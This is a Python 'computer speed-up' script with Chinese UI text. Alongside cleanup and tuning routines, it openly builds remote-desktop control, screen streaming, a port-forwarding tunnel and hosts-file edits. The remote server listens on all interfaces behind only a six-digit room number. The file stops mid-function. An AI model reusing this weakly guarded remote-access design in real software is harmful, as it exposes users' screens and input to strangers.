#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Teto Run Fast - 电脑加速优化脚本
版本: 5.1 旗舰版
功能: 内存优化、CPU优化、网络优化、进程管理、服务器管理、文件传输、深度查杀、内网穿透、远程操控
"""

import os
import sys
import subprocess
import time
import json
import shutil
import ctypes
import platform
import gc
import tempfile
import threading
import socket
import struct
import re
import hashlib
import random
import queue
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple

import warnings

warnings.filterwarnings('ignore')

# 尝试导入可选依赖
PSUTIL_AVAILABLE = False
try:
    import psutil

    PSUTIL_AVAILABLE = True
except ImportError:
    print("⚠️ psutil未安装，部分功能受限")

# 导入socketserver
import socketserver
from http.server import SimpleHTTPRequestHandler

# 音频相关导入
AUDIO_AVAILABLE = False
try:
    import sounddevice as sd
    import numpy as np

    AUDIO_AVAILABLE = True
    print("✅ sounddevice已安装，音频功能可用")
except ImportError:
    print("⚠️ sounddevice未安装，音频功能不可用")
    print("请运行: pip install sounddevice")

# Teto协议标识
TETO_PROTOCOL = b"teto_run"
TETO_PROTOCOL_STR = "teto_run"

# 配置文件
CONFIG_FILE = "teto_config.json"
WHITELIST_FILE = "teto_whitelist.json"
BLACKLIST_FILE = "teto_blacklist.json"
DOMAIN_RULES_FILE = "teto_domain_rules.json"
LOG_FILE = "teto_run_fast.log"
HOSTS_FILE = r"C:\Windows\System32\drivers\etc\hosts" if platform.system() == "Windows" else "/etc/hosts"

# 浏览器进程列表（不会被拦截）
BROWSER_PROCESSES = [
    "chrome", "firefox", "edge", "brave", "opera", "safari",
    "chromium", "iexplore", "msedge", "chrome.exe", "firefox.exe",
    "msedge.exe", "brave.exe", "opera.exe"
]


class StatusWindow:
    """独立状态窗口 - 只显示当前传输状态（不保存历史）"""

    def __init__(self):
        self.root = None
        self.status_label = None
        self.detail_label = None
        self.fps_label = None
        self.quality_label = None
        self.audio_label = None
        self.running = False
        self.thread = None
        self.current_status = "等待连接"
        self.current_detail = ""

    def start(self):
        """启动状态窗口"""
        self.running = True
        self.thread = threading.Thread(target=self._run_window, daemon=True)
        self.thread.start()

    def _run_window(self):
        try:
            import tkinter as tk

            self.root = tk.Tk()
            self.root.title("Teto远程操控 - 传输状态")
            self.root.geometry("400x300")
            self.root.configure(bg='#1e1e1e')
            self.root.attributes('-topmost', True)

            # 标题
            title_label = tk.Label(
                self.root,
                text="📡 实时传输状态",
                font=("微软雅黑", 14, "bold"),
                fg="#00ff00",
                bg="#1e1e1e"
            )
            title_label.pack(pady=15)

            # 状态显示区域
            status_frame = tk.Frame(self.root, bg="#2d2d2d", relief=tk.RAISED, bd=2)
            status_frame.pack(fill=tk.X, padx=20, pady=10)

            self.status_label = tk.Label(
                status_frame,
                text="⚪ 等待连接",
                font=("微软雅黑", 16, "bold"),
                fg="#ffaa00",
                bg="#2d2d2d"
            )
            self.status_label.pack(pady=20)

            # 详细信息
            info_frame = tk.Frame(self.root, bg="#1e1e1e")
            info_frame.pack(fill=tk.X, padx=20, pady=5)

            self.detail_label = tk.Label(
                info_frame,
                text="",
                font=("微软雅黑", 10),
                fg="#aaaaaa",
                bg="#1e1e1e"
            )
            self.detail_label.pack(anchor=tk.W)

            self.fps_label = tk.Label(
                info_frame,
                text="帧率: -- fps",
                font=("微软雅黑", 10),
                fg="#00ccff",
                bg="#1e1e1e"
            )
            self.fps_label.pack(anchor=tk.W, pady=2)

            self.quality_label = tk.Label(
                info_frame,
                text="画质: --",
                font=("微软雅黑", 10),
                fg="#00ccff",
                bg="#1e1e1e"
            )
            self.quality_label.pack(anchor=tk.W, pady=2)

            self.audio_label = tk.Label(
                info_frame,
                text="音频: 关闭",
                font=("微软雅黑", 10),
                fg="#ff6666",
                bg="#1e1e1e"
            )
            self.audio_label.pack(anchor=tk.W, pady=2)

            # 关闭按钮
            close_btn = tk.Button(
                self.root,
                text="关闭窗口",
                command=self._on_close,
                bg="#444444",
                fg="white",
                font=("微软雅黑", 10)
            )
            close_btn.pack(pady=15)

            self.root.protocol("WM_DELETE_WINDOW", self._on_close)
            self.root.mainloop()

        except ImportError:
            print("⚠️ 无法创建状态窗口")

    def _on_close(self):
        self.running = False
        if self.root:
            self.root.destroy()

    def update_status(self, status: str, detail: str = "", status_type: str = "info"):
        """更新传输状态"""
        if not self.running or not self.status_label:
            return

        icons = {"transfer": "📤", "success": "✅", "error": "❌", "info": "⚪"}
        colors = {"transfer": "#ffaa00", "success": "#00ff00", "error": "#ff4444", "info": "#00ccff"}

        icon = icons.get(status_type, "⚪")
        color = colors.get(status_type, "#ffffff")

        self.status_label.config(text=f"{icon} {status}", fg=color)
        self.detail_label.config(text=detail)

    def update_fps(self, fps: float):
        if self.running and self.fps_label:
            self.fps_label.config(text=f"帧率: {fps:.1f} fps")

    def update_quality(self, quality: str, format_name: str = ""):
        if self.running and self.quality_label:
            if format_name:
                self.quality_label.config(text=f"画质: {quality.upper()} ({format_name})")
            else:
                self.quality_label.config(text=f"画质: {quality.upper()}")

    def update_audio(self, enabled: bool, is_mic: bool = False):
        if not self.running or not self.audio_label:
            return
        if is_mic:
            self.audio_label.config(text=f"麦克风: {'开启' if enabled else '关闭'}",
                                    fg="#00ff00" if enabled else "#ff6666")
        else:
            self.audio_label.config(text=f"音频: {'开启' if enabled else '关闭'}",
                                    fg="#00ff00" if enabled else "#ff6666")

    def reset(self):
        self.update_status("等待连接", "", "info")
        self.update_fps(0)

    def show_transferring(self):
        self.update_status("传输中", "正在传输屏幕数据...", "transfer")

    def show_success(self, detail: str = ""):
        self.update_status("成功", detail, "success")
        if self.root:
            self.root.after(3000, self.reset)

    def show_error(self, detail: str = ""):
        self.update_status("失败", detail, "error")
        if self.root:
            self.root.after(3000, self.reset)


class TetoRunFast:
    """Teto Run Fast 主类"""

    def __init__(self):
        """初始化"""
        self.running = True
        self.config = {}
        self.whitelist = {}
        self.blacklist = {}
        self.domain_rules = {}
        self.server_thread = None
        self.monitor_thread = None
        self.file_server_running = False
        self.file_server_socket = None
        self.remote_server_running = False
        self.remote_client_running = False
        self.remote_socket = None
        self.room_id = None
        self.remote_connected = False
        self.status_window = None

        # 远程操控增强配置
        self.audio_enabled = False
        self.mic_enabled = False
        self.audio_stream = None
        self.audio_thread = None
        self.audio = None
        self.quality_level = "medium"

        # 画质设置
        self.quality_settings = {
            "low": {"fps": 10, "format": "JPEG", "quality": 30, "resolution_scale": 0.5, "ext": ".jpg"},
            "medium": {"fps": 20, "format": "JPEG", "quality": 70, "resolution_scale": 0.75, "ext": ".jpg"},
            "high": {"fps": 30, "format": "BMP", "quality": 100, "resolution_scale": 1.0, "ext": ".bmp"},
            "ultra": {"fps": 60, "format": "PNG", "quality": 100, "resolution_scale": 1.0, "ext": ".png"}
        }
        self.quality_lock = threading.Lock()
        self.audio_permission = False
        self.mic_permission = False
        self.current_socket = None

        # 鼠标控制优先级设置
        self.local_mouse_priority = True
        self.mouse_control_timeout = 3
        self.last_local_mouse_time = 0
        self.last_remote_control_time = 0
        self.mouse_control_lock = threading.Lock()
        self.local_mouse_active = False
        self.mouse_hook_setup = False
        self.hook_thread = None

        # 显示Logo
        self._show_logo()

        # 加载所有配置
        self._load_all_configs()

        # 检查管理员权限
        self.is_admin = self._check_admin()
        if not self.is_admin:
            self.log("警告: 未以管理员权限运行，部分功能可能受限", "WARNING")

        # 启动鼠标监控
        if platform.system() == "Windows" and self.is_admin:
            self._start_mouse_monitor()

        # 启动监控线程
        self._start_monitor()

        # 启动状态窗口
        self._start_status_window()

    def _show_logo(self):
        if platform.system() == "Windows":
            os.system('color')
        print("========================================================")
        print("\033[91m __________   _________   __________     ________\033[0m")
        print("\033[91m|____  ____| |   ______| |____  ____|  / ________ \\ \033[0m")
        print("\033[91m    |  |     |  |______      |  |      | |      | | \033[0m")
        print("\033[91m    |  |     |   ______|     |  |      | |      | | \033[0m")
        print("\033[91m    |  |     |  |______      |  |      | |______| | \033[0m")
        print("\033[91m    |__|     |_________|     |__|      \\_________/ \033[0m")
        print("========================================================")
        print("\033[91mTeto Run Fast v5.1 - 电脑优化系统\033[0m")
        print("\033[90m功能: 内存优化 | CPU优化 | 网络优化 | 进程管理 | 服务器 | 远程操控 | 内网穿透\033[0m\n")

    def _check_admin(self) -> bool:
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except AttributeError:
                return False
        return os.geteuid() == 0

    def _start_status_window(self):
        self.status_window = StatusWindow()
        self.status_window.start()
        time.sleep(0.5)

    def _start_mouse_monitor(self):
        """启动鼠标活动监控"""
        if not platform.system() == "Windows":
            return
        try:
            import ctypes.wintypes
            user32 = ctypes.windll.user32

            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

            def monitor_mouse():
                last_x, last_y = -1, -1
                while self.running:
                    try:
                        pt = POINT()
                        user32.GetCursorPos(ctypes.byref(pt))
                        if last_x != -1 and (abs(pt.x - last_x) > 2 or abs(pt.y - last_y) > 2):
                            with self.mouse_control_lock:
                                self.last_local_mouse_time = time.time()
                                self.local_mouse_active = True
                        last_x, last_y = pt.x, pt.y
                        time.sleep(0.05)
                    except:
                        time.sleep(0.1)

            self.hook_thread = threading.Thread(target=monitor_mouse, daemon=True)
            self.hook_thread.start()
            self.mouse_hook_setup = True
            self.log("本地鼠标监控已启动", "SUCCESS")
        except Exception as e:
            self.log(f"鼠标监控启动失败: {e}", "WARNING")

    def _load_all_configs(self):
        self.config = self._load_json(CONFIG_FILE, self._get_default_config())
        self.whitelist = self._load_json(WHITELIST_FILE, {"processes": [], "scripts": [], "domains": []})
        self.blacklist = self._load_json(BLACKLIST_FILE, {"processes": [], "scripts": [], "domains": []})
        self.domain_rules = self._load_json(DOMAIN_RULES_FILE, {"blocked": [], "allowed": [], "optimized": []})

    @staticmethod
    def _get_default_config() -> Dict[str, Any]:
        return {
            "auto_optimize_interval": 30,
            "max_process_runtime": 7200,
            "high_runtime_threshold": 3600,
            "high_cpu_threshold": 80,
            "virus_scan": True,
            "network_optimization": True,
            "server_port": 8080,
            "file_transfer_port": 9000,
            "remote_port": 5000,
            "frp_server": "frp.tetorun.com",
            "frp_port": 7000
        }

    @staticmethod
    def _load_json(file_path: str, default: Any) -> Any:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError):
                return default
        return default

    def _save_json(self, file_path: str, data: Any) -> bool:
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            return True
        except IOError:
            return False

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [{level}] {message}"
        if level == "WARNING":
            print(f"\033[93m{log_msg}\033[0m")
        elif level == "ERROR":
            print(f"\033[91m{log_msg}\033[0m")
        elif level == "SUCCESS":
            print(f"\033[92m{log_msg}\033[0m")
        else:
            print(log_msg)
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_msg + "\n")
        except IOError:
            pass

    # ==================== 内存优化 ====================
    def optimize_memory(self) -> bool:
        self.log("开始优化内存空间...")
        try:
            gc.collect()
            cleaned_count = self._clean_temp_files()
            if platform.system() == "Windows":
                subprocess.run(["ipconfig", "/flushdns"], capture_output=True, timeout=5, check=False)
                prefetch_path = "C:\\Windows\\Prefetch"
                if os.path.exists(prefetch_path):
                    for item in os.listdir(prefetch_path):
                        if item.endswith('.pf'):
                            try:
                                os.remove(os.path.join(prefetch_path, item))
                                cleaned_count += 1
                            except (OSError, PermissionError):
                                pass
                if self.is_admin:
                    try:
                        kernel32 = ctypes.windll.kernel32
                        psapi = ctypes.windll.psapi
                        current_process = kernel32.GetCurrentProcess()
                        psapi.EmptyWorkingSet(current_process)
                    except AttributeError:
                        pass
            self.log(f"内存优化完成，清理了 {cleaned_count} 个临时文件", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"内存优化失败: {e}", "WARNING")
            return False

    def _clean_temp_files(self) -> int:
        cleaned = 0
        temp_dirs = [
            tempfile.gettempdir(),
            os.environ.get('TEMP', ''),
            os.environ.get('TMP', ''),
            os.path.expanduser("~\\AppData\\Local\\Temp") if platform.system() == "Windows" else "/tmp"
        ]
        for temp_dir in temp_dirs:
            if temp_dir and os.path.exists(temp_dir):
                try:
                    for item in os.listdir(temp_dir):
                        item_path = os.path.join(temp_dir, item)
                        try:
                            if os.path.isfile(item_path):
                                os.remove(item_path)
                                cleaned += 1
                            elif os.path.isdir(item_path):
                                shutil.rmtree(item_path, ignore_errors=True)
                                cleaned += 1
                        except (OSError, PermissionError):
                            pass
                except (OSError, PermissionError):
                    pass
        return cleaned

    # ==================== CPU优化 ====================
    def boost_cpu_frequency(self) -> bool:
        self.log("尝试优化CPU性能...")
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["powercfg", "/setactive", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"],
                    capture_output=True, timeout=5, check=False
                )
                if result.returncode == 0:
                    self.log("已设置为高性能电源模式")
                else:
                    subprocess.run(["powercfg", "-duplicatescheme", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"],
                                   capture_output=True, check=False)
                    subprocess.run(["powercfg", "-setactive", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"],
                                   capture_output=True, check=False)
                if PSUTIL_AVAILABLE:
                    cpu_freq = psutil.cpu_freq()
                    if cpu_freq:
                        self.log(f"当前CPU频率: {cpu_freq.current:.0f} MHz")
                        self.log(f"最大CPU频率: {cpu_freq.max:.0f} MHz")
            else:
                try:
                    with open('/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor', 'w') as f:
                        f.write('performance')
                    self.log("已设置CPU为performance模式")
                except (IOError, PermissionError):
                    self.log("无法设置CPU模式，可能需要root权限")
            return True
        except Exception as e:
            self.log(f"CPU优化失败: {e}", "WARNING")
            return False

    # ==================== 网络优化 ====================
    def optimize_network(self) -> bool:
        self.log("优化网络连接...")
        try:
            if platform.system() == "Windows":
                commands = [
                    ["netsh", "int", "tcp", "set", "global", "autotuninglevel=normal"],
                    ["netsh", "int", "tcp", "set", "global", "rss=enabled"],
                    ["ipconfig", "/flushdns"],
                    ["netsh", "winsock", "reset"]
                ]
                for cmd in commands:
                    subprocess.run(cmd, capture_output=True, timeout=5, check=False)
                self.log("网络参数优化完成")
            return True
        except Exception as e:
            self.log(f"网络优化失败: {e}", "WARNING")
            return False

    def get_best_network_path(self, target: str = "8.8.8.8") -> List[str]:
        self.log(f"分析到 {target} 的最佳网络路径...")
        best_path = []
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["tracert", "-d", "-h", "15", target],
                    capture_output=True, text=True, timeout=30, check=False
                )
            else:
                result = subprocess.run(
                    ["traceroute", "-n", "-m", "15", target],
                    capture_output=True, text=True, timeout=30, check=False
                )
            for line in result.stdout.split('\n'):
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if ip_match and 'ms' in line.lower():
                    best_path.append(ip_match.group(1))
            if best_path:
                self.log(f"找到 {len(best_path)} 个路由节点", "SUCCESS")
        except subprocess.SubprocessError:
            self.log("路由追踪失败")
        return best_path

    # ==================== 网站服务器 ====================
    def start_web_server(self, port: int = 8080, file_path: str = None, domain: str = None) -> bool:
        if port is None:
            port = self.config.get("server_port", 8080)
        self.log(f"启动HTTP服务器，端口: {port}")
        if domain:
            self._add_local_domain(domain, port)

        def run_server():
            try:
                if file_path and os.path.exists(file_path):
                    if os.path.isfile(file_path):
                        os.chdir(os.path.dirname(file_path))
                    else:
                        os.chdir(file_path)

                class CustomHandler(SimpleHTTPRequestHandler):
                    def log_message(self, format, *args):
                        pass

                    def end_headers(self):
                        # 添加Teto协议标识
                        self.send_header('X-Powered-By', 'Teto-Run-Fast')
                        super().end_headers()

                with socketserver.TCPServer(("0.0.0.0", port), CustomHandler) as httpd:
                    self.log(f"HTTP服务器已启动", "SUCCESS")
                    self.log(f"本地访问: http://localhost:{port}")
                    if domain:
                        self.log(f"域名访问: http://{domain}:{port}")
                    self.log(f"服务目录: {os.path.abspath('.')}")
                    httpd.serve_forever()
            except Exception as e:
                self.log(f"服务器启动失败: {e}", "ERROR")

        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        return True

    def _add_local_domain(self, domain: str, port: int):
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            with open(HOSTS_FILE, 'a') as f:
                f.write(f"\n127.0.0.1 {domain}\n")
                f.write(f"{local_ip} {domain}\n")
            self.log(f"已添加域名解析: {domain} -> 127.0.0.1 / {local_ip}", "SUCCESS")
            if platform.system() == "Windows":
                subprocess.run(["ipconfig", "/flushdns"], capture_output=True, check=False)
        except PermissionError:
            self.log("需要管理员权限才能修改hosts文件", "WARNING")
        except Exception as e:
            self.log(f"添加域名失败: {e}", "WARNING")

    # ==================== 内网穿透 ====================
    def start_nat_traversal(self, local_port: int, remote_port: int = None) -> bool:
        self.log(f"启动内网穿透，映射本地端口 {local_port}")
        if remote_port is None:
            remote_port = self.config.get("remote_port", 5000)

        def run_traversal():
            try:
                self._start_tcp_tunnel(local_port, remote_port)
            except Exception as e:
                self.log(f"内网穿透失败: {e}", "WARNING")
                self.log("尝试备用方案...", "WARNING")
                self._start_http_tunnel(local_port)

        threading.Thread(target=run_traversal, daemon=True).start()
        return True

    def _start_tcp_tunnel(self, local_port: int, remote_port: int):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', remote_port))
        server_socket.listen(5)
        self.log(f"穿透服务器已启动，端口: {remote_port}", "SUCCESS")
        try:
            import requests
            public_ip = requests.get('https://api.ipify.org').text
            self.log(f"公网访问地址: http://{public_ip}:{remote_port}", "SUCCESS")
        except:
            pass
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                self.log(f"收到穿透连接: {addr}")
                threading.Thread(target=self._forward_traffic,
                                 args=(client_socket, local_port), daemon=True).start()
            except Exception as e:
                if self.running:
                    self.log(f"穿透错误: {e}")

    def _forward_traffic(self, client_socket, local_port):
        try:
            local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            local_socket.connect(('127.0.0.1', local_port))

            def forward(src, dst):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.send(data)
                except:
                    pass
                finally:
                    src.close()
                    dst.close()

            threading.Thread(target=forward, args=(client_socket, local_socket)).start()
            threading.Thread(target=forward, args=(local_socket, client_socket)).start()
        except Exception as e:
            self.log(f"转发失败: {e}")

    def _start_http_tunnel(self, local_port: int):
        self.log("使用HTTP隧道模式...", "WARNING")
        self.log("需要公网服务器支持，请联系管理员", "WARNING")

    # ==================== 远程操控 ====================
    def create_remote_room(self, port: int = 5000) -> str:
        self.log("创建远程操控房间...")
        self.room_id = str(random.randint(100000, 999999))
        self.remote_server_running = True

        if self.status_window:
            self.status_window.update_status("等待连接", f"房间号: {self.room_id}", "info")

        print(f"\n{'=' * 50}")
        print(f"\033[92m🏠 房间已创建！房间号: {self.room_id}\033[0m")
        print(f"\033[93m📢 请将此房间号告诉对方: {self.room_id}\033[0m")
        print(f"{'=' * 50}\n")

        def run_remote_server():
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(5)
            self.remote_socket = server_socket
            self.log(f"等待对方连接... 端口: {port}", "SUCCESS")
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            self.log(f"本机IP: {local_ip}", "INFO")
            try:
                import requests
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
                self.log(f"公网IP: {public_ip}", "INFO")
            except:
                pass

            while self.remote_server_running:
                try:
                    client_socket, addr = server_socket.accept()
                    # 房间号验证
                    try:
                        # 先接收Teto协议标识
                        protocol = client_socket.recv(len(TETO_PROTOCOL))
                        if protocol != TETO_PROTOCOL:
                            client_socket.close()
                            self.log(f"无效的Teto协议", "WARNING")
                            continue
                        # 接收房间号
                        data = client_socket.recv(1024).decode()
                        if data.startswith("ROOM:"):
                            received_room = data[5:]
                            if received_room != self.room_id:
                                client_socket.send(b"ERROR")
                                client_socket.close()
                                self.log(f"房间号错误: {received_room}", "WARNING")
                                if self.status_window:
                                    self.status_window.show_error("房间号验证失败")
                                continue
                            else:
                                client_socket.send(b"OK")
                        else:
                            client_socket.send(b"ERROR")
                            client_socket.close()
                            continue
                    except Exception as e:
                        self.log(f"验证失败: {e}", "WARNING")
                        client_socket.close()
                        continue

                    self.current_socket = client_socket
                    self.remote_connected = True
                    self.log(f"对方已连接: {addr}", "SUCCESS")
                    if self.status_window:
                        self.status_window.show_success("连接成功")
                        self.status_window.update_status("已连接", "远程操控已建立", "success")
                    self._handle_remote_control(client_socket)

                except Exception as e:
                    if self.remote_server_running:
                        self.log(f"连接错误: {e}")

        threading.Thread(target=run_remote_server, daemon=True).start()
        return self.room_id

    def join_remote_room(self, target_ip: str, room_id: str, port: int = 5000) -> bool:
        self.log(f"尝试加入房间 {room_id} @ {target_ip}:{port}...")
        if self.status_window:
            self.status_window.update_status("连接中", f"正在连接 {target_ip}:{port}...", "transfer")

        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)
            client_socket.connect((target_ip, port))

            # 发送Teto协议标识
            client_socket.send(TETO_PROTOCOL)
            # 发送房间号
            client_socket.send(f"ROOM:{room_id}".encode())

            response = client_socket.recv(1024).decode()
            if response == "OK":
                self.current_socket = client_socket
                self.remote_connected = True
                self.log("已加入房间，开始远程操控...", "SUCCESS")
                if self.status_window:
                    self.status_window.show_success("连接成功")
                    self.status_window.update_status("已连接", "远程操控已建立", "success")
                self._handle_remote_control(client_socket, is_controller=True)
                return True
            else:
                self.log(f"房间号验证失败", "ERROR")
                if self.status_window:
                    self.status_window.show_error("房间号验证失败")
                client_socket.close()
                return False
        except socket.timeout:
            self.log("连接超时", "ERROR")
            if self.status_window:
                self.status_window.show_error("连接超时")
            return False
        except ConnectionRefusedError:
            self.log("连接被拒绝", "ERROR")
            if self.status_window:
                self.status_window.show_error("连接被拒绝")
            return False
        except Exception as e:
            self.log(f"连接失败: {e}", "ERROR")
            if self.status_window:
                self.status_window.show_error(f"连接失败: {str(e)[:50]}")
            return False

    def _handle_remote_control(self, sock, is_controller: bool = False):
        self.log("远程操控已建立", "SUCCESS")
        if is_controller:
            self._control_remote_desktop(sock)
        else:
            self._share_desktop(sock)

    def _check_control_permission(self) -> bool:
        with self.mouse_control_lock:
            current_time = time.time()
            if self.local_mouse_priority:
                if current_time - self.last_local_mouse_time < self.mouse_control_timeout:
                    return False
                return True
            else:
                return True

    def _share_desktop(self, sock):
        """共享桌面（被控端）"""
        self.log("开始共享桌面...", "SUCCESS")
        self._send_quality_request(sock)

        try:
            import mss
            from PIL import Image
            import io

            with mss.mss() as sct:
                monitor = sct.monitors[1]
                if self.audio_enabled and AUDIO_AVAILABLE:
                    self._start_audio_stream(sock, is_host=True)

                frame_count = 0
                last_fps_time = time.time()

                while self.remote_server_running:
                    start_time = time.time()
                    with self.quality_lock:
                        quality = self.quality_settings[self.quality_level]
                        fps_target = quality["fps"]
                        scale = quality["resolution_scale"]
                        img_format = quality["format"]
                        img_quality = quality["quality"]

                    screenshot = sct.grab(monitor)
                    if scale < 1.0:
                        new_width = int(screenshot.width * scale)
                        new_height = int(screenshot.height * scale)
                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                        img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    else:
                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

                    img_buffer = io.BytesIO()
                    if img_format == "JPEG":
                        img.save(img_buffer, format='JPEG', quality=img_quality, optimize=True)
                    elif img_format == "BMP":
                        img.save(img_buffer, format='BMP')
                    elif img_format == "PNG":
                        img.save(img_buffer, format='PNG', optimize=True)
                    else:
                        img.save(img_buffer, format='JPEG', quality=70)

                    img_data = img_buffer.getvalue()
                    sock.send(struct.pack('>BI', 0x01, len(img_data)))
                    sock.send(img_data)

                    # 更新状态窗口帧率
                    frame_count += 1
                    if time.time() - last_fps_time >= 1.0:
                        if self.status_window:
                            self.status_window.update_fps(frame_count)
                        frame_count = 0
                        last_fps_time = time.time()

                    sock.settimeout(0.01)
                    try:
                        data = sock.recv(4096)
                        if data:
                            self._execute_remote_command(data.decode())
                    except socket.timeout:
                        pass
                    finally:
                        sock.settimeout(None)

                    elapsed = time.time() - start_time
                    sleep_time = max(0, (1.0 / fps_target) - elapsed)
                    time.sleep(sleep_time)

        except ImportError as e:
            self.log(f"缺少截图库，请安装: pip install mss pillow numpy", "ERROR")
            self._share_desktop_fallback(sock)
        except Exception as e:
            self.log(f"桌面共享错误: {e}", "ERROR")

    def _share_desktop_fallback(self, sock):
        """备用桌面共享"""
        self.log("使用备用模式共享桌面...", "WARNING")
        while self.remote_server_running:
            try:
                if platform.system() == "Windows":
                    screenshot_path = tempfile.gettempdir() + "\\screenshot.png"
                    subprocess.run([
                        "powershell",
                        "Add-Type -AssemblyName System.Windows.Forms; " +
                        "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
                        "$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); " +
                        "$graphics = [System.Drawing.Graphics]::FromImage($bitmap); " +
                        "$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); " +
                        f"$bitmap.Save('{screenshot_path}')"
                    ], capture_output=True, timeout=2, check=False)
                    if os.path.exists(screenshot_path):
                        with open(screenshot_path, 'rb') as f:
                            img_data = f.read()
                        sock.send(struct.pack('>BI', 0x01, len(img_data)))
                        sock.send(img_data)
                        os.remove(screenshot_path)
                else:
                    screenshot_path = "/tmp/screenshot.png"
                    subprocess.run(["import", "-window", "root", screenshot_path],
                                   capture_output=True, timeout=2, check=False)
                    if os.path.exists(screenshot_path):
                        with open(screenshot_path, 'rb') as f:
                            img_data = f.read()
                        sock.send(struct.pack('>BI', 0x01, len(img_data)))
                        sock.send(img_data)
                time.sleep(0.1)
            except Exception as e:
                self.log(f"截图失败: {e}")
                time.sleep(1)

    def _control_remote_desktop(self, sock):
        """控制远程桌面（控制端）"""
        self.log("开始接收远程桌面...", "SUCCESS")
        self.log("提示: 移动鼠标可控制对方", "WARNING")
        self._request_quality_change(sock)

        try:
            import tkinter as tk
            from PIL import Image, ImageTk
            import io

            root = tk.Tk()
            root.title("Teto远程操控 - 对方桌面")
            root.geometry("1280x720")
            root.configure(bg='#1e1e1e')

            menubar = tk.Menu(root)
            root.config(menu=menubar)

            # 优先级菜单
            priority_menu = tk.Menu(menubar, tearoff=0)
            menubar.add_cascade(label="控制优先级", menu=priority_menu)
            priority_menu.add_command(label="🖱️ 本地优先（对方鼠标优先）",
                                      command=lambda: self._set_priority_mode(True, sock))
            priority_menu.add_command(label="🌐 远程优先（控制端优先）",
                                      command=lambda: self._set_priority_mode(False, sock))

            # 音频菜单
            audio_menu = tk.Menu(menubar, tearoff=0)
            menubar.add_cascade(label="音频", menu=audio_menu)
            audio_menu.add_command(label="🔊 开启对方声音", command=lambda: self._toggle_audio(sock, True))
            audio_menu.add_command(label="🔇 关闭对方声音", command=lambda: self._toggle_audio(sock, False))
            audio_menu.add_separator()
            audio_menu.add_command(label="🎤 开启麦克风", command=lambda: self._toggle_mic(sock, True))
            audio_menu.add_command(label="🎙️ 关闭麦克风", command=lambda: self._toggle_mic(sock, False))

            # 画质菜单
            quality_menu = tk.Menu(menubar, tearoff=0)
            menubar.add_cascade(label="画质", menu=quality_menu)
            quality_menu.add_command(label="📱 低清 (JPEG, 10fps)",
                                     command=lambda: self._change_quality(sock, "low"))
            quality_menu.add_command(label="💻 标清 (JPEG, 20fps)",
                                     command=lambda: self._change_quality(sock, "medium"))
            quality_menu.add_command(label="🖥️ 高清 (BMP, 30fps)",
                                     command=lambda: self._change_quality(sock, "high"))
            quality_menu.add_command(label="🎬 超清 (PNG, 60fps)",
                                     command=lambda: self._change_quality(sock, "ultra"))

            status_frame = tk.Frame(root, bg="#1e1e1e")
            status_frame.pack(side=tk.BOTTOM, fill=tk.X)

            priority_label = tk.Label(status_frame, text="模式: 本地优先", fg="blue", bg="#1e1e1e")
            priority_label.pack(side=tk.LEFT, padx=5)

            status_label = tk.Label(status_frame, text="状态: 连接中...", fg="blue", bg="#1e1e1e")
            status_label.pack(side=tk.LEFT, padx=5)

            audio_status_label = tk.Label(status_frame, text="🔇 声音关闭", fg="gray", bg="#1e1e1e")
            audio_status_label.pack(side=tk.LEFT, padx=5)

            mic_status_label = tk.Label(status_frame, text="🎤 麦克风关闭", fg="gray", bg="#1e1e1e")
            mic_status_label.pack(side=tk.LEFT, padx=5)

            quality_label = tk.Label(status_frame, text=f"画质: {self.quality_level}", fg="green", bg="#1e1e1e")
            quality_label.pack(side=tk.RIGHT, padx=5)

            # 帧率显示
            fps_label = tk.Label(status_frame, text="帧率: -- fps", fg="#00ccff", bg="#1e1e1e")
            fps_label.pack(side=tk.RIGHT, padx=10)

            canvas = tk.Canvas(root, cursor="cross", bg="black")
            canvas.pack(fill=tk.BOTH, expand=True)

            last_x, last_y = None, None
            frame_count = 0
            last_fps_time = time.time()

            def on_mouse_move(event):
                nonlocal last_x, last_y
                if last_x is not None and last_y is not None:
                    dx = event.x - last_x
                    dy = event.y - last_y
                    if dx != 0 or dy != 0:
